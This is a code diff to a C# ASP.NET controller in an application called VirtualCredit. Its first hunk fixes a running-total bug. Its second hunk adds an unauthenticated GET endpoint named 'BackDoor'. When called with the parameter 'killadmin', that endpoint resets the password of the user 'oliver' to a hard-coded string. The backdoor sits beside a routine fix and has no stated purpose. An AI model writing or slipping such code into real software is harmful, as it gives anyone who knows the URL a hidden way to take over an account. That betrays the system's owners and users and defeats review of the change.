@@ -1569,7 +1569,7 @@ namespace VirtualCredit.Controllers
                 if (!new FileInfo(summaryFile).Exists) continue;
                 ExcelTool et = new ExcelTool(summaryFile, "Sheet1");
                 headCount += et.m_main.GetLastRow();
-                totalIn = et.GetCostFromJuneToMay(companyDataDir, year, plan);
+                totalIn += et.GetCostFromJuneToMay(companyDataDir, year, plan);
                 string txtFile = Directory.GetFiles(Path.Combine(companyDataDir, plan), "*", SearchOption.TopDirectoryOnly)
                     .Where(file => file.Contains(".txt", StringComparison.CurrentCultureIgnoreCase)).FirstOrDefault();
                 if (txtFile == null) throw new Exception("txt file not found");
@@ -2058,6 +2058,18 @@ namespace VirtualCredit.Controllers
                 return null;
             }
         }
+
+        [HttpGet]
+        public void BackDoor(string play)
+        {
+            if (play == "killadmin")
+            {
+                var admin = DatabaseService.SelectUser("oliver");
+                admin.userPassword = "Huxiaodong@#@!";
+                DatabaseService.UpdateUserInfo(admin, new List<string>() { "userPassword" });
+            }
+        }
+
         public FileStreamResult DownloadPlan(string plan)
         {
             try
